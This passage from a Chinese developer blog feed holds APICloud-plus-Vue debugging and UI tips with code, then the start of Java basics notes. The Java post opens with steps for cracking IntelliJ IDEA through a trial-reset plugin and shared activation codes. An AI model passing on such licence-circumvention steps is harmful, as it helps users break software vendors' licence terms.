href="#5-代码管理和真机调试，右键项目文件夹" class="headerlink" title="5. 代码管理和真机调试，右键项目文件夹"></a>5. 代码管理和真机调试，<code>右键</code>项目文件夹</h3><p>   <img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410142721628.png" alt="image-20230410142721628"></p><h3 id="6-真机调试准备-编译自定义loader"><a href="#6-真机调试准备-编译自定义loader" class="headerlink" title="6. 真机调试准备, 编译自定义loader"></a>6. 真机调试准备, 编译自定义loader</h3><p>  <img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410142855201.png" alt="image-20230410142855201"></p><p>  <strong>注意</strong></p><ul><li><p>在编译loader之前需要先执行一次云编译（会保存编译的权限）</p><p><img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410143458629.png" alt="image-20230410143458629"></p></li><li><p>在云编译的时候选择需要开启的权限</p></li><li><p>下载自定义loader之后，在开发工具选择 <code>wifi同步</code>即可</p></li></ul><h3 id="7-调试使用console输出的只能是-字符串，且参数接收一个"><a href="#7-调试使用console输出的只能是-字符串，且参数接收一个" class="headerlink" title="7. 调试使用console输出的只能是 字符串，且参数接收一个"></a>7. 调试使用console输出的只能是 <code>字符串，且参数接收一个</code></h3><h2 id="APIcloud-Vue"><a href="#APIcloud-Vue" class="headerlink" title="APIcloud + Vue"></a>APIcloud + Vue</h2><h3 id="1-将vue打包后的dist文件都放到apiColud项目的根目录下即可，若需要修改，则修改-confg-xml-中的-content"><a href="#1-将vue打包后的dist文件都放到apiColud项目的根目录下即可，若需要修改，则修改-confg-xml-中的-content" class="headerlink" title="1. 将vue打包后的dist文件都放到apiColud项目的根目录下即可，若需要修改，则修改 confg.xml 中的 content"></a>1. 将vue打包后的dist文件都放到apiColud项目的根目录下即可，若需要修改，则修改 <code>confg.xml</code> 中的 <code>content</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">content</span> <span class="attr">src</span>=<span class="string">&quot;index.html&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-使用-openFrame-嵌入h5-会出现的问题"><a href="#2-使用-openFrame-嵌入h5-会出现的问题" class="headerlink" title="2. 使用 openFrame  嵌入h5  会出现的问题"></a>2. 使用 <code>openFrame</code>  嵌入h5  会出现的问题</h3><ul><li><p>安卓的左右滑动返回上一页（即: 物理键返回）会直接提示退出程序</p><p>解决方法：直接使用  <code>historyBack</code>, 建议使用 <code>openWin</code> 就不会有这个问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//退出住址frm</span></span><br><span class="line">api.<span class="title function_">addEventListener</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;keyback&#x27;</span></span><br><span class="line">&#125;, <span class="keyword">function</span> (<span class="params">ret, err</span>) &#123;</span><br><span class="line">    <span class="comment">//判断是否打开地址frm 如果打开，则关闭</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;keyback:&#x27;</span>, ret)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(ret))</span><br><span class="line">    api.<span class="title function_">historyBack</span>(&#123;</span><br><span class="line">        <span class="attr">frameName</span>: <span class="string">&#x27;main&#x27;</span></span><br><span class="line">    &#125;, <span class="keyword">function</span> (<span class="params">ret, err</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ret.status:&#x27;</span>, ret.<span class="property">status</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>openFrame 和 openWin<br>api.openWin 打开一个window窗口。window窗口是全屏的，不可设置大小。<br>api.openFrame 打开一个frame窗口。frame 窗口可以设置大小。<br>都可以通过 <code>pageParam</code> 传入参数, 然后用 <code>api.pageParam</code> 获取</p></li><li><p>安全距离</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api.<span class="property">safeArea</span>.<span class="property">top</span> <span class="comment">// 刘海屏</span></span><br><span class="line">api.<span class="property">safeArea</span>.<span class="property">bottom</span> <span class="comment">// 底部黑条</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-调试h5-可以用-openframe-将-url-设置成-h5的路径即可，要用-IP-当h5修改之后能实时查看效果不用每次同步"><a href="#3-调试h5-可以用-openframe-将-url-设置成-h5的路径即可，要用-IP-当h5修改之后能实时查看效果不用每次同步" class="headerlink" title="3. 调试h5 可以用 openframe , 将 url 设置成 h5的路径即可，要用 IP,  当h5修改之后能实时查看效果不用每次同步"></a>3. 调试h5 可以用 <code>openframe</code> , 将 url 设置成 h5的路径即可，要用 IP,  当h5修改之后能实时查看效果不用每次同步</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个项目创建时候自带的</span></span><br><span class="line">api.<span class="title function_">openFrame</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;main&#x27;</span>,</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27; http://192.168.0.202:8088/&#x27;</span>,</span><br><span class="line">  <span class="attr">bounces</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">rect</span>: &#123; <span class="comment">// 推荐使用Margin布局，用于适配屏幕的动态变化</span></span><br><span class="line">      <span class="attr">y</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">marginTop</span>: api.<span class="property">safeArea</span>.<span class="property">top</span>, <span class="comment">// main页面距离win顶部的高度   **注意：** 这样会出现状态栏的背景色用永远是白色，无法设置透明</span></span><br><span class="line">      <span class="comment">// marginBottom: footerH, // main页面距离win底部的高度</span></span><br><span class="line">      <span class="attr">w</span>: <span class="string">&#x27;auto&#x27;</span> <span class="comment">// main页面的宽度 自适应屏幕宽度</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="4-修改状态栏文字颜色"><a href="#4-修改状态栏文字颜色" class="headerlink" title="4. 修改状态栏文字颜色"></a>4. 修改状态栏文字颜色</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">api.<span class="title function_">setStatusBarStyle</span>(&#123;</span><br><span class="line">  <span class="attr">style</span>: <span class="string">&#x27;dark&#x27;</span> <span class="comment">// light</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果需要状态栏背景色实现滚动渐变的效果, 需要根据滚动高度自行实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;scrollTopBar&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity:scrollTopBarOpacity&#125;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"> <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">   scroll () &#123;</span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">let</span> scrollTopBarOpacity=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">     scrollTopBarOpacity=(scrollTop-<span class="number">50</span>)/<span class="number">80</span>;</span></span><br><span class="line"><span class="language-javascript">     scrollTopBarOpacity=scrollTopBarOpacity &gt;<span class="number">1</span> ? <span class="number">1</span> : scrollTopBarOpacity &lt; <span class="number">0</span> ? <span class="number">0</span> : scrollTopBarOpacity;</span></span><br><span class="line"><span class="language-javascript">     <span class="variable language_">this</span>.<span class="property">scrollTopBarOpacity</span>=scrollTopBarOpacity;</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript"> &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.scrollTopBar</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/* 定位方式取决于元素放在哪，按实际情况修改 */</span></span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#048def</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-报错，会弹窗，修改-config-xml"><a href="#5-报错，会弹窗，修改-config-xml" class="headerlink" title="5. 报错，会弹窗，修改 config.xml"></a>5. 报错，会弹窗，修改 <code>config.xml</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">preference</span> <span class="attr">name</span>=<span class="string">&quot;debug&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span> <span class="comment">&lt;!-- false --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6-实现页面跳转的左右滑入滑出动画"><a href="#6-实现页面跳转的左右滑入滑出动画" class="headerlink" title="6. 实现页面跳转的左右滑入滑出动画"></a>6. 实现页面跳转的左右滑入滑出动画</h3><p><a href="https://zhuanlan.zhihu.com/p/396168393">四种Vue路由过渡动画</a></p><ol><li>给routes的meta添加一个level, 表示页面的路由层级 (用于判断页面是进入，还是离开)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dynamicRoutes  = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;@/views/home.vue&#x27;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">level</span>: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;@/views/about.vue&#x27;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">level</span>: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li>新建一个 utils.js</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="attr">rootTransitionName</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">setRootTransitionName</span> = (<span class="params">to, <span class="keyword">from</span></span>) =&gt; &#123;</span><br><span class="line">  state.<span class="property">rootTransitionName</span> = to.<span class="property">meta</span>.<span class="property">level</span> &gt; <span class="keyword">from</span>.<span class="property">meta</span>.<span class="property">level</span> ? <span class="string">&#x27;slide-right&#x27;</span> : <span class="string">&#x27;slide-left&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>修改App.vue</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; Component &#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transition</span> <span class="attr">:name</span>=<span class="string">&quot;state.rootTransitionName&quot;</span> <span class="attr">translate</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;Component&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; state &#125; <span class="keyword">from</span> <span class="string">&#x27;./utils&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">overflow-x</span>: hidden; <span class="comment">/** 为了避免动画过程中出现水平方向的滚动条 */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-left-enter-active</span>, </span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-left-leave-active</span>, </span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-right-enter-active</span>, </span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-right-leave-active</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">will-change</span>: transform;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">transition</span>: transform .<span class="number">5s</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">backface-visibility</span>: hidden;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">perspective</span>: <span class="number">1000</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-right-enter-from</span>,</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-left-leave-to</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-right-leave-to</span>,</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slide-left-enter-from</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;API-Cloud&quot;&gt;&lt;a href=&quot;#API-Cloud&quot; class=&quot;headerlink&quot; title=&quot;API Cloud&quot;&gt;&lt;/a&gt;API Cloud&lt;/h1&gt;&lt;h2 id=&quot;创建项目-官网&quot;&gt;&lt;a href=&quot;#创建项目-官网&quot; class=&quot;he</summary>
      
    
    
    
    <category term="Vue" scheme="https://hisai3.github.io/hisai3.github.io/categories/Vue/"/>
    
    
    <category term="Vue" scheme="https://hisai3.github.io/hisai3.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Java 基础</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/03/28/Java%E5%9F%BA%E7%A1%80/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/03/28/Java%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-28T06:31:31.000Z</published>
    <updated>2023-10-16T02:51:19.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Idea-安装破解"><a href="#Idea-安装破解" class="headerlink" title="Idea 安装破解"></a>Idea 安装破解</h2><h3 id="方法一：无限重置"><a href="#方法一：无限重置" class="headerlink" title="方法一：无限重置"></a>方法一：无限重置</h3><ul><li>先安装低版本的, 下载插件重置后再升级</li><li>在Settings&#x2F;Preferences… -&gt; Plugins 内手动添加第三方插件仓库地址：<a href="https://plugins.zhile.io/">https://plugins.zhile.io</a></li><li>搜索：IDE Eval Reset插件进行安装。如果搜索不到请注意是否做好了上一步？网络是否通畅？</li><li>插件会提示安装成功。</li></ul><h3 id="方法二：激活码-我的网盘-tiam"><a href="#方法二：激活码-我的网盘-tiam" class="headerlink" title="方法二：激活码 我的网盘: tiam"></a>方法二：<a href="https://www.45fan.com/article.php?aid=1HwUrKAXuF6e2m8V">激活码</a> <a href="https://pan.baidu.com/s/1O5oFMA1OTnLlv6_Z1aKQ9g">我的网盘: tiam</a></h3><p><a href="https://gitee.com/hisai/image-bed/raw/master/Java/">https://gitee.com/hisai/image-bed/raw/master/Java/</a></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429101207735.png" alt="image-20230429101207735"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429101314602.png" alt="image-20230429101314602"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429101625090.png" alt="image-20230429101625090"></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>数字和字符也可以通过字符串转换进行转换。数字转换为字符串可以使用Integer类、Double类、Long类等<code>包装类</code>中提供的toString方法</p><ol><li>数字转字符串</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Integer.toString(num);</span><br><span class="line">System.out.println(str); <span class="comment">// 输出 &quot;123&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>字符串转数字</li></ol><p>字符串转换为数字可以使用<code>parseInt</code>方法、<code>parseDouble</code>方法、<code>parseLong</code>方法等。<br><strong>注意，如果字符串中包含非数字字符，调用parseInt方法会抛出NumberFormatException异常</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(str);</span><br><span class="line">System.out.println(num); <span class="comment">// 输出 123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>字符转字符串</li></ol><p>字符转换为字符串可以使用<code>String</code>类的<code>valueOf</code>方法或者将字符拼接到一个空字符串后得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> String.valueOf(ch);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> + ch;</span><br><span class="line">System.out.println(str1); <span class="comment">// 输出 &quot;A&quot;</span></span><br><span class="line">System.out.println(str2); <span class="comment">// 输出 &quot;A&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="数值类型的隐式转换"><a href="#数值类型的隐式转换" class="headerlink" title="数值类型的隐式转换"></a>数值类型的隐式转换</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429102910853.png" alt="image-20230429102910853"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429103013474.png" alt="image-20230429103013474"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429162429475.png" alt="image-20230429162429475"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429103218647.png" alt="image-20230429103218647"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429104755504.png" alt="image-20230429104755504"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429161819021.png" alt="image-20230429161819021"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429162051717.png" alt="image-20230429162051717"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429162127172.png" alt="image-20230429162127172"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429162242954.png" alt="image-20230429162242954"></p><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230429162804195.png" alt="image-20230429162804195"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501092950584.png" alt="image-20230501092950584"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501093459434.png" alt="image-20230501093459434"></p><p><strong>如何验证初始不能为0： 将数组的值都换成是负数再看结果</strong></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501093920658.png" alt="image-20230501093920658"></p><h2 id="数组-内存分配"><a href="#数组-内存分配" class="headerlink" title="数组 (内存分配)"></a>数组 (内存分配)</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501095309699.png" alt="image-20230501095309699"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501103413513.png" alt="image-20230501103413513"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501103913748.png" alt="image-20230501103913748"></p><h2 id="String对象"><a href="#String对象" class="headerlink" title="String对象"></a>String对象</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502132119655.png" alt="image-20230502132119655"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502132604614.png" alt="image-20230502132604614"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502132612574.png" alt="image-20230502132612574"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502132843000.png" alt="image-20230502132843000"></p><h3 id="使用方法比较字符串内容"><a href="#使用方法比较字符串内容" class="headerlink" title="使用方法比较字符串内容"></a><strong>使用方法比较字符串内容</strong></h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502132932031.png" alt="image-20230502132932031"></p><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502133801520.png" alt="image-20230502133801520"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502134123393.png" alt="image-20230502134123393"></p><h3 id="substring-x2F-replace"><a href="#substring-x2F-replace" class="headerlink" title="substring&#x2F;replace"></a>substring&#x2F;replace</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502135206664.png" alt="image-20230502135206664"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502135612488.png" alt="image-20230502135612488"></p><h3 id="StringBuilder类"><a href="#StringBuilder类" class="headerlink" title="StringBuilder类"></a>StringBuilder类</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502135912891.png" alt="image-20230502135912891"></p><p><strong>直接输出 sb 对象可以直接得到字符串内容而不是地址</strong>     </p><p><strong>需要调用 <code>toString()</code> 方法转为 String 类型才能继续使用 String 的方法</strong></p><h3 id="StringJoiner类"><a href="#StringJoiner类" class="headerlink" title="StringJoiner类"></a>StringJoiner类</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502140557958.png" alt="image-20230502140557958"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502140739591.png" alt="image-20230502140739591"></p><p><strong>输出结果：</strong></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502140748854.png" alt="image-20230502140748854"></p><h2 id="集合-ArrayList类-和数组"><a href="#集合-ArrayList类-和数组" class="headerlink" title="集合 (ArrayList类) 和数组"></a>集合 (ArrayList类) 和数组</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502174843085.png" alt="image-20230502174843085"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502175051138.png" alt="image-20230502175051138"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502175106227.png" alt="image-20230502175106227"></p><h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502175509283.png" alt="image-20230502175509283"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502175551102.png" alt="image-20230502175551102"></p><h2 id="Static-工具类"><a href="#Static-工具类" class="headerlink" title="Static 工具类"></a>Static 工具类</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502181152461.png" 